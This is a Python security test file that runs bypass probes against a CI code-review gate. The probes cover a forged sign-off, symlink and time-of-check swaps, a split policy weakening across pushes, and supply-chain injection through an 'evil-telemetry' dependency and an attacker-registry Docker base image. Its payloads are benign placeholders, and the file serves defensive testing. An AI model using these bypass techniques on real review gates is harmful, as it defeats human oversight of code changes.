def attack_A12_hard_floor_signoff_forgery(base_dir: Path, engine) -> dict:
    fx = _new_fixture(base_dir, engine, "A12")
    try:
        base = fx.base_sha
        (fx.root / "config.env").write_text("DB_PASSWORD=old\n", encoding="utf-8")
        commit_all(fx.root, "add config.env baseline")
        base2 = head_sha(fx.root)

        # (a) forged/unsigned sign-off — exactly what any agent able to
        # write a file could produce pre-fix.
        (fx.root / "config.env").write_text("DB_PASSWORD=rotated-by-attacker\n", encoding="utf-8")
        write_forged_signoff(
            fx.root, "credentials", "credentials", "Xavier",
            "Reviewed refund logic change directly; approved out-of-band (FORGED — no signature).",
        )
        head_forged = commit_all(fx.root, "rotate credential + FORGED (unsigned) signoff")
        r_forged, payload_forged = fx.gate_ci(base2, head_forged)
        forged_blocked = payload_forged["blocked"]
        forged_hard_floor = any("HARD FLOOR" in reason for reason in payload_forged["reasons"])

        # (b) genuinely signed sign-off (real, registered Xavier key) — the
        # mechanism's actual, satisfiable escape valve. §3-c/§3-d also added
        # `.tess/gate/signoffs/**` to tess-os-security-tier-doctrine's own
        # globs (layered, not either/or): introducing the sign-off ARTIFACT
        # is now itself `prod_touching` and needs a covering Reid/Cyra
        # verdict, on top of the sign-off's own internal signature. This
        # fixture registers real Reid/Cyra keys (unlike the real shipped
        # policy's empty defaults), so the demonstration adds that covering
        # verdict too — exactly the real, intended two-layer clearance path.
        signed_signoff_path = fx.root / ".tess" / "gate" / "signoffs" / "credentials.signoff.json"
        signed_signoff_path.unlink()
        write_signed_signoff(
            fx.root, "credentials", "credentials", "Xavier",
            "Reviewed refund logic change directly; approved out-of-band (validly signed).",
            engine, fx.keys["Xavier"],
        )
        signoff_blob = blob_sha(fx.root, ".tess/gate/signoffs/credentials.signoff.json")
        covering_verdict = base_verdict(
            [".tess/gate/signoffs/**"], {".tess/gate/signoffs/credentials.signoff.json": signoff_blob},
            verifier="Reid",
        )
        covering_verdict["signature"] = fx.sign(covering_verdict, "Reid")
        write_verdict(fx.root, "verdicts/signoffs-dir.verdict.md", covering_verdict)
        head_signed = commit_all(
            fx.root, "rotate credential + VALIDLY-SIGNED signoff + covering Reid verdict for the signoffs dir",
        )
        r_signed, payload_signed = fx.gate_ci(base2, head_signed)
        signed_clears = not payload_signed["blocked"]

        blocked = forged_blocked and forged_hard_floor and signed_clears
        mechanism = (
            f"credentials hard floor matched config.env. Forged (unsigned, shape-valid-"
            f"only) sign-off: blocked={forged_blocked}, hard_floor_reason_present="
            f"{forged_hard_floor} ({payload_forged['reasons']}). With the SAME sign-off "
            f"cryptographically signed by a REAL, registered operator key in "
            f"policy.signoff_keys, PLUS a covering Reid verdict for the now-governed "
            f"signoffs directory itself: blocked={payload_signed['blocked']} "
            f"({payload_signed['reasons']}) — proving the mechanism is a real, "
            f"satisfiable escape valve once AUTHENTICATED, not a hard floor that is "
            f"either permanently broken or permanently unusable."
        )
        return {
            "id": "A12", "name": "hard-floor sign-off forgery (honesty-capstone-audit-2026-07-08 §3-d)",
            "description": (
                "An unsigned, shape-valid-only sign-off (forgeable by any agent that can "
                "write a file) must NOT clear a hard floor; the same sign-off, "
                "cryptographically signed by a registered operator key, must."
            ),
            "blocked": blocked, "mechanism": mechanism,
            "evidence": {"forged": payload_forged, "signed": payload_signed},
        }
    finally:
        fx.teardown()


# ---------------------------------------------------------------------------
# A13 — EVALUATE-THEN-SWAP (TOCTOU family), disclosed 2026-07-15. Three
# sub-probes against "the thing the gate evaluated is not the thing that
# actually lands":
#
#   (a) content-swap (blob -> blob), CONTROL: the gate returns green for
#       commit X (compliant: prod change + valid signed verdict); a
#       DIFFERENT commit Y (malicious, no verdict) then replaces X at the
#       same ref (force-push / rebase / post-approval amend). `tessctl gate`
#       is stateless — it re-validates whatever base..head it is handed —
#       so this probe confirms Y is independently re-blocked when re-run
#       (it is: BLOCKED). The residual window is a CI-trigger /
#       branch-protection layer that reuses X's green status for a merged Y
#       WITHOUT re-running the check — already disclosed as the repo-admin
#       boundary (README.md / conductor/verdict-signing.md's defense-in-depth
#       section), not an engine gap.
#
#   (b) TYPE-swap (blob -> symlink) — REAL ENGINE GAP, FOUND AND FIXED:
#       converting a governed prod file into a SYMLINK pointing at an
#       ungoverned payload was a git TYPE change (status letter T), which
#       `_gate_diff_paths`'s `--diff-filter=ACMR` EXCLUDED — the governed
#       path silently stopped being "changed" at all, with the gate
#       returning green and zero verdict required for the swap. FIX: the
#       diff-filter is now `ACMRT` (`.tess/bin/tessctl` `_gate_diff_paths` /
#       `_gate_changed_paths_staged`) — a type-change is now classified same
#       as any other edit to that path, and (since `_gate_git_ls_tree`
#       still, deliberately, excludes symlink entries from the tree index —
#       LOW-1, a symlink's target isn't trustworthy path metadata) a path
#       that is a symlink at head can never satisfy ANY covering verdict's
#       artifact_hashes — fail-closed.
#
#   (c) disk-vs-head-ref divergence — REAL ENGINE GAP, FOUND AND FIXED (the
#       sharpest instance of "evaluate one commit, a different commit/state
#       is what lands"): `_gate_load_policy`, `_gate_validate_contracts` /
#       `_gate_validate_one_contract_file`, and the hard-floor
#       `_gate_validate_signoff` all used to read POLICY, CONTRACT, and
#       SIGN-OFF content from the ON-DISK WORKING TREE — which has NO
#       enforced correspondence to `--head`, the ref `gate ci`/`gate
#       pre-push` are actually told to evaluate. A build step run before the
#       gate, a stale/partial checkout, or — per actions/checkout's own
#       documented DEFAULT behavior of checking out the synthetic MERGE
#       commit for `pull_request` events rather than `pull_request.head.
#       sha` (see the PR description for the citation) — an entirely
#       ORDINARY PR checkout, could already disagree with `--head` before
#       `tessctl gate ci` ever runs. Two concrete, empirically-proven
#       instances: (c1) a policy rule that unambiguously exists in HEAD's
#       own committed git tree can be silently skipped if a WEAKER policy
#       happens to be on disk at check time; (c2) a hard-floor sign-off
#       (credentials/money-movement/destructive-prod-data — the MOST
#       sensitive category) can be cleared by an artifact that exists ONLY
#       on disk, NEVER committed to git history — zero audit trail for who
#       authorized it, defeating the entire point of the sign-off
#       requirement. THIS DEFEATS A11'S OWN FIX TOO: even the "trusted,
#       base-ref-extracted engine" CI defense still reads disk for these
#       three data sources — pinning the ENGINE BINARY does not pin the
#       DATA it reads. FIX: `_gate_run_ship_check` now builds ONE
#       `tree_index` from the actual pushed `head_shas` up front and
#       threads it through policy load, contract validation, AND sign-off
#       validation — all three now resolve content via `git ls-tree`/`git
#       cat-file` at head (the same primitive covering-verdict discovery
#       already used, HIGH-1(c)), never `root / rel_path` on disk.
# ---------------------------------------------------------------------------

def attack_A13_toctou_evaluate_then_swap(base_dir: Path, engine) -> dict:
    results = {}

    # (a) content-swap: X blessed, Y swapped in — does the engine re-validate?
    fx = _new_fixture(base_dir, engine, "A13a")
    try:
        base = fx.base_sha
        (fx.root / "src" / "prod" / "app.py").write_text("print('prod v2 — reviewed')\n", encoding="utf-8")
        blob = blob_sha(fx.root, "src/prod/app.py")
        verdict = base_verdict(["src/prod/**"], {"src/prod/app.py": blob}, verifier="Quinn")
        verdict["signature"] = fx.sign(verdict, "Quinn")
        write_verdict(fx.root, "verdicts/prod-src.verdict.md", verdict)
        head_x = commit_all(fx.root, "prod v2 + valid signed verdict (the APPROVED commit X)")
        _r_x, payload_x = fx.gate_ci(base, head_x)
        x_green = not payload_x["blocked"]  # time-of-check: gate blessed X

        # SWAP: discard X and land Y (malicious, NO verdict) at the same ref —
        # exactly what a force-push / rebase-then-merge does after X went green.
        git(fx.root, "reset", "--hard", base)
        (fx.root / "src" / "prod" / "app.py").write_text("print('prod v3 — MALICIOUS, never reviewed')\n", encoding="utf-8")
        head_y = commit_all(fx.root, "prod v3 — swapped in after X was green (commit Y)")
        _r_y, payload_y = fx.gate_ci(base, head_y)  # does the gate re-validate Y's content?
        y_blocked = payload_y["blocked"]
        results["content_swap"] = {
            "blocked": y_blocked,
            "x_green": x_green,
            "reasons": payload_y["reasons"],
            "note": (
                "the engine is stateless and re-validates whatever base..head it is handed: "
                "X went green, Y (the swapped-in malicious head) is independently BLOCKED when "
                "the gate is re-run on it. The residual TOCTOU window — a CI/branch-protection "
                "layer that reuses X's green status for a merged Y without re-running on Y — is "
                "the repo-admin boundary README.md already discloses, not an engine gap."
                if y_blocked else
                "the gate did NOT re-block the swapped-in malicious head Y — engine-level "
                "evaluate-then-swap slips."
            ),
        }
    finally:
        fx.teardown()

    # (b) TYPE-swap: convert a governed prod blob into a symlink -> ungoverned payload.
    fx = _new_fixture(base_dir, engine, "A13b")
    try:
        base = fx.base_sha  # src/prod/app.py is a governed regular blob (v1) at base
        # An ungoverned payload the symlink will resolve to (matches no policy
        # rule). Benign on purpose — a print, not a shell sink: this is a
        # fixture string the arena never executes; it only needs to stand in
        # for "arbitrary attacker-chosen prod behavior" to make the point.
        (fx.root / "payload.py").write_text(
            "# Attacker-controlled. Ungoverned path (not under any policy glob).\n"
            "print('prod-behavior-swapped-without-review')\n",
            encoding="utf-8",
        )
        app = fx.root / "src" / "prod" / "app.py"
        app.unlink()
        os.symlink("../../payload.py", app)  # blob -> symlink : git status letter T
        head = commit_all(fx.root, "chore: relink app.py (payload.py is ungoverned) — type-swap")
        r, payload = fx.gate_ci(base, head)
        changed = payload["changed_paths"] if payload else []
        blocked = payload["blocked"] if payload else (r.returncode != 0)
        app_seen = "src/prod/app.py" in changed
        results["type_swap"] = {
            "blocked": blocked,
            "changed_paths": changed,
            "app_py_classified": app_seen,
            "reasons": payload["reasons"] if payload else None,
            "note": (
                "src/prod/app.py converted blob->symlink is a git TYPE change (T). FIX: "
                "_gate_diff_paths's diff-filter is now ACMRT (was ACMR, which EXCLUDED type "
                "changes) — app.py now correctly appears in changed_paths (app_py_classified: "
                + str(app_seen) + "), gets classified same as any other edit, and — since "
                "_gate_git_ls_tree still deliberately drops mode-120000 symlink entries from the "
                "tree index (LOW-1) — can never satisfy any covering verdict's artifact_hashes, "
                "so the swap is fail-closed blocked rather than invisible."
            ),
        }
    finally:
        fx.teardown()

    # (c) disk-vs-head-ref divergence: the ON-DISK working tree at check time
    # is made to diverge from `--head`'s own COMMITTED git tree (simulating a
    # build step that runs before the gate, a stale/partial checkout, or an
    # ordinary `pull_request` checkout — actions/checkout's documented
    # default is the synthetic MERGE commit, not `pull_request.head.sha`).
    # head's git history (what actually lands / gets merged) is untouched
    # and, on its own, unambiguously requires a verdict; only the transient,
    # never-committed on-disk state is tampered.
    #
    # (c1) policy: a brand-new, first-time protective rule is added to
    # policy.yaml in the SAME commit as the payload it's meant to cover (with
    # a fully legitimate, validly-signed Reid verdict for the policy edit
    # itself, isolating the variable under test) — then disk is reverted
    # (UNCOMMITTED) to the pre-existing policy that never had the rule.
    fx = _new_fixture(base_dir, engine, "A13c1")
    try:
        import yaml
        policy_path = fx.root / "core" / "policy" / "policy.yaml"
        policy = yaml.safe_load(policy_path.read_text(encoding="utf-8"))
        policy["policy"]["rules"] = [r for r in policy["policy"]["rules"] if r.get("id") != "prod-src"]
        policy_path.write_text(yaml.safe_dump(policy, sort_keys=False), encoding="utf-8")
        weak_policy_text = policy_path.read_text(encoding="utf-8")
        commit_all(fx.root, "baseline: project has no src/prod/** coverage yet")
        base = head_sha(fx.root)

        policy2 = yaml.safe_load(policy_path.read_text(encoding="utf-8"))
        policy2["policy"]["rules"].append({
            "id": "prod-src", "description": "First-time coverage for src/prod/**.",
            "globs": ["src/prod/**"], "classification": ["prod_touching"],
            "require_verdict": True, "allowed_verifiers": ["Quinn"],
        })
        policy_path.write_text(yaml.safe_dump(policy2, sort_keys=False), encoding="utf-8")
        pol_blob = blob_sha(fx.root, "core/policy/policy.yaml")
        pv = base_verdict(["core/policy/**"], {"core/policy/policy.yaml": pol_blob}, verifier="Reid")
        pv["signature"] = fx.sign(pv, "Reid")
        write_verdict(fx.root, "verdicts/policy-edit.verdict.md", pv)
        commit_all(fx.root, "add src/prod/** coverage rule, legitimately reviewed by Reid")

        (fx.root / "src" / "prod").mkdir(parents=True, exist_ok=True)
        (fx.root / "src" / "prod" / "app.py").write_text("print('prod v2 — MALICIOUS, no verdict')\n", encoding="utf-8")
        head = commit_all(fx.root, "ship src/prod/app.py (no verdict)")

        _r_ctl, payload_ctl = fx.gate_ci(base, head)
        control_blocked = payload_ctl["blocked"]  # disk == head (honest case) — must block

        policy_path.write_text(weak_policy_text, encoding="utf-8")  # disk-only revert, UNCOMMITTED
        _r_atk, payload_atk = fx.gate_ci(base, head)
        attack_blocked = payload_atk["blocked"]

        trusted_rc, trusted_out = fx.gate_ci_via_real_ci_workflow(base, head)
        trusted_blocked = trusted_rc != 0  # proves the fix also covers A11's "trusted engine" CI path

        results["disk_vs_head_policy"] = {
            "blocked": control_blocked and attack_blocked and trusted_blocked,
            "control_blocked": control_blocked, "attack_blocked": attack_blocked,
            "trusted_engine_blocked": trusted_blocked,
            "reasons_attack": payload_atk["reasons"],
            "note": (
                f"CONTROL (disk==head): {'BLOCKED' if control_blocked else 'SLIPPED'}. "
                f"ATTACK (disk reverted to pre-existing weaker policy, UNCOMMITTED — head's own "
                f"git tree is untouched and still requires a Quinn verdict for src/prod/app.py): "
                f"{'BLOCKED' if attack_blocked else 'SLIPPED THROUGH'} ({payload_atk['reasons']}). "
                f"Real CI workflow (trusted, base-ref-extracted engine — A11's own fix): "
                f"{'BLOCKED' if trusted_blocked else 'SLIPPED THROUGH — defeats A11 fix too'}. "
                f"FIX: _gate_load_policy now resolves policy content via the committed head ref's "
                f"own git tree (tree_index), never `root / rel_path` on disk."
            ),
        }
    finally:
        fx.teardown()

    # (c2) hard-floor sign-off: a fully valid, correctly-signed sign-off is
    # planted ON DISK ONLY, never committed — no `git log`/`git show` would
    # ever reveal it. head's git history has NO sign-off at all.
    fx = _new_fixture(base_dir, engine, "A13c2")
    try:
        (fx.root / "config.env").write_text("DB_PASSWORD=old\n", encoding="utf-8")
        commit_all(fx.root, "add config.env baseline")
        base = head_sha(fx.root)
        (fx.root / "config.env").write_text("DB_PASSWORD=rotated-by-attacker\n", encoding="utf-8")
        head = commit_all(fx.root, "rotate credential — NO signoff committed at all")

        _r_ctl, payload_ctl = fx.gate_ci(base, head)
        control_blocked = payload_ctl["blocked"]  # no signoff anywhere — must block

        write_signed_signoff(
            fx.root, "credentials", "credentials", "Xavier",
            "Planted on disk only, never committed to git history.", engine, fx.keys["Xavier"],
        )
        _r_atk, payload_atk = fx.gate_ci(base, head)
        attack_blocked = payload_atk["blocked"]

        results["disk_vs_head_signoff"] = {
            "blocked": control_blocked and attack_blocked,
            "control_blocked": control_blocked, "attack_blocked": attack_blocked,
            "reasons_attack": payload_atk["reasons"],
            "note": (
                f"CONTROL (no signoff anywhere): {'BLOCKED' if control_blocked else 'SLIPPED'}. "
                f"ATTACK (validly-signed credentials sign-off planted on disk, UNCOMMITTED — zero "
                f"trace in git history): {'BLOCKED' if attack_blocked else 'SLIPPED THROUGH — hard '
                'floor cleared with no audit trail in git history'} ({payload_atk['reasons']}). "
                f"FIX: _gate_validate_signoff now requires the sign-off be COMMITTED at the pushed "
                f"head ref's own git tree, never merely present on disk."
            ),
        }
    finally:
        fx.teardown()

    # The class holds only if EVERY sub-probe is defended.
    all_blocked = all(v["blocked"] for v in results.values())
    mechanism = " | ".join(
        f"{k}: {'BLOCKED' if v['blocked'] else 'SLIPPED'} — {v['note']}" for k, v in results.items()
    )
    return {
        "id": "A13", "name": "evaluate-then-swap (TOCTOU): content-swap, blob->symlink type-swap, disk-vs-head-ref divergence",
        "description": (
            "Swap the content/state the gate actually reads out from under the ref it is told to "
            "evaluate. (a) CONTROL — a malicious commit Y replaces the approved commit X at the "
            "same ref: does the gate re-validate Y's content (yes, it is stateless)? (b) A governed "
            "prod file is converted blob->symlink, a git TYPE change the diff-filter used to "
            "exclude. (c) The on-disk working tree at check time is made to diverge from the ref "
            "`--head` is told to evaluate — policy.yaml's own committed rule (c1) and a hard-floor "
            "sign-off's own committed presence (c2) both used to be read from disk instead of "
            "head's git tree."
        ),
        "blocked": all_blocked, "mechanism": mechanism, "evidence": results,
    }


# ---------------------------------------------------------------------------
# A14 — MULTI-COMMIT SPLIT-PAYLOAD across separately-MERGED pushes. A3 proves
# the gate blocks a weaken-the-policy-AND-exploit-it tamper when both halves
# ride the SAME push (base..head unions the pre-push baseline policy). This
# probes whether that protection COMPOSES across the push boundary: split the
# same logical tamper into two independently-gated merges —
#   push 1: weaken the policy (remove the prod-src rule) WITH a valid signed
#           Reid verdict for the policy edit (models a reviewer approving a
#           benign-looking "cleanup" PR — the policy file is itself governed,
#           so this half is correctly gated and cannot land key-free);
#   push 2: ship the malicious prod change with NO verdict, based on the
#           already-weakened tree.
# A3's baseline is only ever `args.base` — the IMMEDIATELY-preceding merge —
# so once the weakening has landed in push 1, push 2's baseline is already
# weak and the malicious code faces no rule. The control case (both edits in
# ONE push off the original strong base) must still be A3-BLOCKED.
# ---------------------------------------------------------------------------

def attack_A14_split_payload_across_pushes(base_dir: Path, engine) -> dict:
    import yaml
    results = {}

    fx = _new_fixture(base_dir, engine, "A14")
    try:
        b0 = fx.base_sha  # strong baseline: prod-src rule present

        # --- PUSH 1: weaken policy (remove prod-src) + a valid signed Reid verdict. ---
        policy_path = fx.root / "core" / "policy" / "policy.yaml"
        policy = yaml.safe_load(policy_path.read_text(encoding="utf-8"))
        policy["policy"]["rules"] = [r for r in policy["policy"]["rules"] if r.get("id") != "prod-src"]
        policy_path.write_text(yaml.safe_dump(policy, sort_keys=False), encoding="utf-8")
        pol_blob = blob_sha(fx.root, "core/policy/policy.yaml")
        v = base_verdict(["core/policy/**"], {"core/policy/policy.yaml": pol_blob}, verifier="Reid")
        v["signature"] = fx.sign(v, "Reid")
        write_verdict(fx.root, "verdicts/policy-cleanup.verdict.md", v)
        p1 = commit_all(fx.root, "chore: simplify policy (remove 'unused' prod-src rule)")
        _r1, payload1 = fx.gate_ci(b0, p1)
        push1_blocked = payload1["blocked"]

        # --- PUSH 2: malicious prod change, NO verdict, based on the weakened tree. ---
        (fx.root / "src" / "prod" / "app.py").write_text("print('prod v2 — MALICIOUS, unreviewed')\n", encoding="utf-8")
        p2 = commit_all(fx.root, "prod change (no verdict — baseline already weakened in push 1)")
        _r2, payload2 = fx.gate_ci(p1, p2)
        push2_blocked = payload2["blocked"]
    finally:
        fx.teardown()

    # --- CONTROL: the SAME two edits in ONE push off the strong base b0 => A3 must BLOCK. ---
    fx2 = _new_fixture(base_dir, engine, "A14ctl")
    try:
        b0c = fx2.base_sha
        policy_path = fx2.root / "core" / "policy" / "policy.yaml"
        policy = yaml.safe_load(policy_path.read_text(encoding="utf-8"))
        policy["policy"]["rules"] = [r for r in policy["policy"]["rules"] if r.get("id") != "prod-src"]
        policy_path.write_text(yaml.safe_dump(policy, sort_keys=False), encoding="utf-8")
        (fx2.root / "src" / "prod" / "app.py").write_text("print('prod v2 — MALICIOUS, unreviewed')\n", encoding="utf-8")
        combined = commit_all(fx2.root, "chore: simplify policy + prod change (same push)")
        _rc, payload_ctl = fx2.gate_ci(b0c, combined)
        single_push_blocked = payload_ctl["blocked"]
    finally:
        fx2.teardown()

    results["push1_policy_weaken"] = {"blocked": push1_blocked, "reasons": payload1["reasons"]}
    results["push2_malicious_prod"] = {"blocked": push2_blocked, "reasons": payload2["reasons"]}
    results["control_single_push"] = {"blocked": single_push_blocked, "reasons": payload_ctl["reasons"]}

    # The class is "defended" only if the split malicious push (push 2) is blocked.
    blocked = push2_blocked
    mechanism = (
        f"CONTROL (both edits, one push off strong base): {'BLOCKED' if single_push_blocked else 'SLIPPED'} "
        f"(A3 baseline-union). SPLIT push 1 (policy weaken + valid signed Reid verdict): "
        f"{'BLOCKED' if push1_blocked else 'landed'} ({payload1['reasons']}). SPLIT push 2 "
        f"(malicious prod, NO verdict, base = weakened push-1 head): "
        f"{'BLOCKED' if push2_blocked else 'NOT BLOCKED — SLIPPED THROUGH'} ({payload2['reasons']}). "
        f"A3's baseline is only the immediately-preceding merge, so protection does NOT compose "
        f"across the push boundary once a weakening has landed. DEPENDENCY: push 1 is correctly "
        f"gated and requires a real Reid/Cyra verdict to land (key custody / an approving reviewer) "
        f"— the erosion is not key-free; it is the disclosed 'a merged weakening lowers the floor' "
        f"boundary, sharpened by push 2 shipping arbitrary unreviewed prod code with a GREEN gate "
        f"and no flag."
    )
    return {
        "id": "A14", "name": "multi-commit split-payload across separately-merged pushes",
        "description": (
            "Split a weaken-policy-then-exploit tamper (A3-blocked in one push) into two "
            "independently-gated merges: an approved policy 'cleanup' that removes a rule, then "
            "an unreviewed prod change against the now-weakened baseline. Does A3's same-push "
            "protection compose across the push boundary?"
        ),
        "blocked": blocked, "mechanism": mechanism, "evidence": results,
    }


# ---------------------------------------------------------------------------
# A15 — DEPENDENCY / SUPPLY-CHAIN INJECTION, disclosed 2026-07-15. The gate's
# classification model is PURELY path-glob-based; it has no built-in notion
# that a dependency manifest/lockfile is prod_touching. FOUND: as shipped
# BEFORE this PR, NEITHER the arena's forked policy NOR this repo's OWN REAL,
# LIVE `core/policy/policy.yaml` had any rule for `requirements-dev.txt` /
# `uv.lock` / `pyproject.toml` / `package.json` etc. — a governed, UNMODIFIED
# CI workflow (this repo's real `.github/workflows/ci.yml` runs `pip install
# -r requirements-dev.txt` then `python -m pytest`; `create-tess/`, `gui/`,
# `starter/` each `npm ci`/`pnpm install` from their own lockfile) would
# install and execute an injected/typosquatted dependency with ZERO covering
# verdict — the attacker never touches a file the gate inspected at all.
# FIXED (the enumerated instance): `core/policy/policy.yaml` now has a
# `dependency-manifests` rule covering every manifest/lockfile format
# actually present in this repo (uv.lock, pyproject.toml,
# requirements-dev.txt, package.json, package-lock.json, pnpm-lock.yaml) plus
# common formats it doesn't currently use. RESIDUAL, DISCLOSED, NOT FIXED (by
# design — this is a coverage-ENUMERATION fix, not a general capability): a
# lockfile format not in that list, or a non-lockfile supply-chain vector
# (Dockerfile base-image tag, vendored dependency, git submodule pointer) is
# STILL invisible to the gate — proven empirically below, not asserted.
# CONTROL: editing the workflow FILE itself is gated (A8's class) — proving
# the gate protects the CI trigger but, before this fix, not the trigger's
# supply chain, and even after it, only the ENUMERATED part of it.
# ---------------------------------------------------------------------------

def attack_A15_supply_chain_dependency_injection(base_dir: Path, engine) -> dict:
    results = {}
    fx = _new_fixture(base_dir, engine, "A15")
    try:
        # Seed the real supply-chain surface into the baseline: a dependency
        # manifest + a governed workflow that install-and-executes it (mirrors
        # this repo's actual ci.yml). Committed as the baseline (pre-existing,
        # already-reviewed history) so the attack diff is base2..head.
        (fx.root / "requirements-dev.txt").write_text("pytest>=7.0\nPyYAML>=6.0\n", encoding="utf-8")
        wf = fx.root / ".github" / "workflows"
        wf.mkdir(parents=True, exist_ok=True)
        (wf / "ci.yml").write_text(
            "name: CI\non: [push]\njobs:\n  test:\n    runs-on: ubuntu-latest\n"
            "    steps:\n      - run: pip install -r requirements-dev.txt\n"
            "      - run: python -m pytest\n",
            encoding="utf-8",
        )
        base2 = commit_all(fx.root, "ci: add test workflow + requirements-dev.txt (baseline)")

        # ATTACK: edit the dependency manifest — inject a dep the governed
        # ci.yml will `pip install` and pytest will import/execute.
        (fx.root / "requirements-dev.txt").write_text(
            "pytest>=7.0\nPyYAML>=6.0\n"
            "evil-telemetry==6.6.6  # attacker-injected: arbitrary code on install/import in CI\n",
            encoding="utf-8",
        )
        head = commit_all(fx.root, "chore: pin an extra dev dependency")
        r, payload = fx.gate_ci(base2, head)
        manifest_blocked = payload["blocked"] if payload else (r.returncode != 0)
        results["manifest_edit_enumerated_format"] = {
            "blocked": manifest_blocked,
            "changed_paths": payload["changed_paths"] if payload else None,
            "reasons": payload["reasons"] if payload else None,
            "note": (
                "FIX: core/policy/policy.yaml's new `dependency-manifests` rule now globs "
                "requirements*.txt (this repo's real policy, forked verbatim into this fixture — "
                "same convention as A3/A8's own self-protection tests) — the manifest edit is now "
                "classified prod_touching and blocked without a covering Quinn/Reid/Cyra verdict, "
                "same as any other governed path. blocked=" + str(manifest_blocked)
            ),
        }

        # RESIDUAL GAP (disclosed, not fixed): an UNLISTED lockfile format —
        # a Dockerfile FROM base-image tag bump — is still invisible. Proven
        # empirically, not asserted: this is what an ENUMERATED fix leaves
        # open, by design, for any format/ecosystem not on the list.
        (fx.root / "Dockerfile").write_text("FROM python:3.11-slim\nRUN pip install -r requirements-dev.txt\n", encoding="utf-8")
        base3 = commit_all(fx.root, "add Dockerfile (baseline)")
        (fx.root / "Dockerfile").write_text(
            "FROM attacker-controlled-registry.example/python:3.11-slim-pwned\n"
            "RUN pip install -r requirements-dev.txt\n",
            encoding="utf-8",
        )
        head3 = commit_all(fx.root, "chore: bump base image tag")
        r3, payload3 = fx.gate_ci(base3, head3)
        dockerfile_blocked = payload3["blocked"] if payload3 else (r3.returncode != 0)
        results["residual_gap_unlisted_format"] = {
            "blocked": dockerfile_blocked,
            "reasons": payload3["reasons"] if payload3 else None,
            "note": (
                "Dockerfile (base-image supply chain, NOT a lockfile format on the new rule's "
                "list): " + ("unexpectedly blocked — re-check the glob list" if dockerfile_blocked else
                "NOT blocked, BY DESIGN — this is the disclosed, residual boundary of an ENUMERATED "
                "fix: a supply-chain vector not on the list remains invisible to the gate, exactly "
                "as example-prod-service-placeholder's own comment already discloses for prod-path "
                "coverage generally. This is NOT presented as fixed.")
            ),
        }

        # CONTROL: editing the workflow FILE itself IS gated (.github/workflows/**).
        (wf / "ci.yml").write_text(
            "name: CI\non: [push]\njobs:\n  test:\n    runs-on: ubuntu-latest\n"
            "    steps:\n      - run: echo tampered\n",
            encoding="utf-8",
        )
        head_wf = commit_all(fx.root, "ci: edit the workflow file directly (control)")
        r2, payload2 = fx.gate_ci(base2, head_wf)
        workflow_blocked = payload2["blocked"] if payload2 else (r2.returncode != 0)
        results["control_workflow_edit"] = {
            "blocked": workflow_blocked,
            "reasons": payload2["reasons"] if payload2 else None,
            "note": ".github/workflows/** IS governed — a direct workflow edit needs a Reid/Cyra verdict.",
        }
    finally:
        fx.teardown()

    # "blocked" tracks the SPECIFIC, disclosed A15 finding: is an edit to a
    # real, currently-used dependency manifest/lockfile now classified and
    # gated? The residual "unlisted format" sub-probe is an EXPLICITLY
    # disclosed, BY-DESIGN boundary of an enumerated fix (same treatment A8
    # gives its own disclosed GH-branch-protection boundary) — it does not
    # get graded as a fresh slip, it gets reported honestly alongside the fix.
    blocked = results["manifest_edit_enumerated_format"]["blocked"]
    mechanism = (
        f"ENUMERATED FORMAT (requirements-dev.txt): "
        f"{'BLOCKED' if results['manifest_edit_enumerated_format']['blocked'] else 'NOT BLOCKED — SLIPPED THROUGH'} "
        f"({results['manifest_edit_enumerated_format']['reasons']}) — "
        f"{results['manifest_edit_enumerated_format']['note']}. "
        f"RESIDUAL, DISCLOSED BOUNDARY (Dockerfile base-image bump, not on the enumerated list): "
        f"{'blocked' if results['residual_gap_unlisted_format']['blocked'] else 'NOT blocked, BY DESIGN'} "
        f"({results['residual_gap_unlisted_format']['reasons']}) — "
        f"{results['residual_gap_unlisted_format']['note']} "
        f"CONTROL — direct workflow-file edit: "
        f"{'BLOCKED' if results['control_workflow_edit']['blocked'] else 'SLIPPED'} "
        f"({results['control_workflow_edit']['reasons']}). "
        f"FOUND (as shipped before this PR): the gate governed the CI trigger FILE "
        f"(.github/workflows/**) but NOT the dependency manifests that governed workflow "
        f"install-and-executes — real, live gap in this repo's own core/policy/policy.yaml, not "
        f"just the arena's fixture. FIXED: a new `dependency-manifests` rule closes the enumerated "
        f"instance (every manifest/lockfile format this repo actually uses). NOT generalized: an "
        f"unlisted format or non-lockfile supply-chain vector remains invisible — disclosed, not "
        f"papered over."
    )
    return {
        "id": "A15", "name": "dependency / supply-chain injection (ungoverned manifest)",
        "description": (
            "Inject unreviewed behavior through a dependency manifest/lockfile. FOUND: no policy "
            "rule (in the arena's fixture OR this repo's own real, shipped policy.yaml) classified "
            "these as prod_touching, even though a governed, unmodified CI workflow installs and "
            "executes exactly what they declare. FIXED (enumerated): a new `dependency-manifests` "
            "rule. DISCLOSED, NOT FIXED: an unlisted format/vector, proven via a Dockerfile probe."
        ),
        "blocked": blocked, "mechanism": mechanism, "evidence": results,
    }


ALL_ATTACKS = [
    attack_A1_no_verify_local_bypass,
    attack_A2_hard_floor_valid_verdict_insufficient,
    attack_A3_policy_tamper_same_push,
    attack_A4_unsigned_verdict,
    attack_A5_wrong_key_signature,
    attack_A6_tampered_after_signing,
    attack_A7_uncommitted_preplanted_verdict,
    attack_A8_workflow_neuter_same_push,
    attack_A9_stale_artifact_hash_replay,
    attack_A10_shape_attacks,
    attack_A11_same_push_engine_tamper,
    attack_A12_hard_floor_signoff_forgery,
    attack_A13_toctou_evaluate_then_swap,
    attack_A14_split_payload_across_pushes,
    attack_A15_supply_chain_dependency_injection,
]
